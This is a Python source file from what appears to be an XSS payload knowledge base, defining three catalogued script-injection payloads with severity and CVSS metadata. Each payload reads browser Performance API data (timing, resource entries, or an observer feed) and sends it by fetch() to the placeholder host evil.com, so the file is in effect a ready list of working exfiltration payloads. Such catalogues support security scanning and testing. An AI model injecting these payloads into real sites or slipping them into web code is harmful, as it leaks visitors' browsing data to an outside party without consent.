#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

Performance API XSS Payloads
"""

from ..models import PayloadEntry


PERFORMANCE_PAYLOADS = {
    "perf_1": PayloadEntry(
        payload="<script>fetch('//evil.com/log?timing='+JSON.stringify(performance.timing))</script>",
        contexts=["html_content", "javascript"],
        severity="medium",
        cvss_score=5.5,
        description="Performance timing leak",
        tags=["performance", "timing", "leak"],
        reliability="high",
    ),
    "perf_2": PayloadEntry(
        payload="<script>performance.getEntries().forEach(e=>fetch('//evil.com/log?resource='+encodeURIComponent(e.name)))</script>",
        contexts=["html_content", "javascript"],
        severity="medium",
        cvss_score=5.5,
        description="Resource timing leak",
        tags=["performance", "resources", "leak"],
        reliability="high",
    ),
    "perf_3": PayloadEntry(
        payload="<script>new PerformanceObserver(l=>l.getEntries().forEach(e=>fetch('//evil.com/log?'+e.entryType+'='+e.name))).observe({entryTypes:['resource','navigation']})</script>",
        contexts=["html_content", "javascript"],
        severity="medium",
        cvss_score=6.0,
        description="Performance observer spy",
        tags=["performance", "observer", "spy"],
        reliability="high",
    ),
}

PERFORMANCE_PAYLOADS_TOTAL = len(PERFORMANCE_PAYLOADS)
